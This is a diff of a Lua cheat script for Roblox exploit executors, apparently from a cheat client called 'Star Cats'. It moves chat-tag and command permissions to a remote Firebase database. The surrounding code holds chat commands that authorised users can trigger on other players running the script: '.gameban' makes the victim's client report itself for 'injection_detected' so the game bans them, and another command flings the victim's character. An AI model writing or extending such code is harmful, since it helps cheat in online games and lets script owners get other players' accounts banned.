@@ -1,28 +1,39 @@
 local textChatService = game:GetService("TextChatService")
-
-local whitelisted = {
-    {name = "AltAccDetectionFrfr", tags = {1}},
-}
-	
+request = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or getgenv().request or request
 local chatTags = {
+    [0] = {name = "STARCATS USER", color = Color3.fromRGB(200,200,200)},
     [1] = {name = "STAR", color = Color3.fromRGB(255, 0, 0)},
-    [2] = {name = "Kai", color = Color3.fromRGB(113, 3, 255)},
+    [2] = {name = "Sarah", color = Color3.fromRGB(113, 3, 255)},
     [3] = {name = "VAPE PRIVATE", color = Color3.fromRGB(255, 76.5, 76.5)},
     [4] = {name = "MONT", color = Color3.fromRGB(255, 76.5, 76.5)},
     [5] = {name = "BOOSTER", color = Color3.fromRGB(244, 127, 255)},
 }
 
 local function getPlayerTags(playerName)
-    for _, player in ipairs(whitelisted) do
-        if player.name == playerName then
-            return player.tags
-        end
+    local PlayerUserID = game:GetService("Players"):FindFirstChild(playerName).UserId
+    local Response1 = request({
+        Url = "https://star-cats-hacks-default-rtdb.europe-west1.firebasedatabase.app/ChatTagsV1/"..tostring(PlayerUserID).."/tags.json",
+        Method = "GET"
+    })
+    local Response = request({
+        Url = "https://star-cats-hacks-default-rtdb.europe-west1.firebasedatabase.app/ChatTagsV1/"..PlayerUserID.."/Enabled.json?shallow=true",
+        Method = "GET"
+    })
+    local ChatTagEnabled = (Response.Body == "true" and true or Response.Body == "false" and false or Response.Body == "null" and false)
+    if Response.Body ~= "null" and ChatTagEnabled then
+        return game:GetService("HttpService"):JSONDecode(Response1.Body)
     end
     return {}
 end
 
 local function isPlayerAllowed(playerName)
-    return #getPlayerTags(playerName) > 0
+    local PlayerUserID = game:GetService("Players"):FindFirstChild(playerName).UserId
+    local Response = request({
+        Url = "https://star-cats-hacks-default-rtdb.europe-west1.firebasedatabase.app/ChatTagsV1/"..PlayerUserID.."/Commands.json?shallow=true",
+        Method = "GET"
+    })
+    local CommandsEnabled = (Response.Body == "true" and true or Response.Body == "false" and false or Response.Body == "null" and false)
+    return CommandsEnabled
 end
 
 local function formatTag(tagData)
@@ -32,8 +43,18 @@ end
 local function getFormattedTags(playerName)
     local tags = getPlayerTags(playerName)
     local formattedTags = ""
-    for _, tag in ipairs(tags) do
-        formattedTags = formattedTags .. formatTag(chatTags[tag]) .. " "
+    for n, fun in pairs(tags) do
+        _G[fun] = 0
+    end
+    for n, fun in pairs(tags) do
+        _G[fun] = _G[fun] + 1
+    end
+    for _, tag in pairs(tags) do
+        if _G[tag] == 1 then
+            formattedTags = formattedTags .. formatTag(chatTags[tonumber(tag)]) .. " "
+        else
+            _G[tag] = _G[tag] - 1
+        end
     end
     return formattedTags
 end
@@ -63,6 +84,10 @@ local function removeBlindGui()
     if gui then
         gui:Destroy()
     end
+end
+
+function teleportToGame(p)
+    game:GetService("TeleportService"):Teleport(p, game.Players.LocalPlayer)
 end
 
 local lighting = game:GetService("Lighting")
@@ -127,7 +152,7 @@ local cmds = {
         end
     end,
     [".gameban"] = function()
-        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+        if game.PlaceId == 6872274481 and not isPlayerAllowed(game.Players.LocalPlayer.Name) then
             local rs = game:GetService("ReplicatedStorage")
             local remote = rs:FindFirstChild("SelfReport", true)
             remote:FireServer("injection_detected")
@@ -152,7 +177,7 @@ local cmds = {
             for i = 1, 3 do
                 newPosition = newPosition + Vector3.new(10000, 10010000100001000000, 100001000010000)
                 humanoidRootPart.CFrame = newPosition
-                wait(0.01)
+                task.wait(0.01)
             end
         end
     end
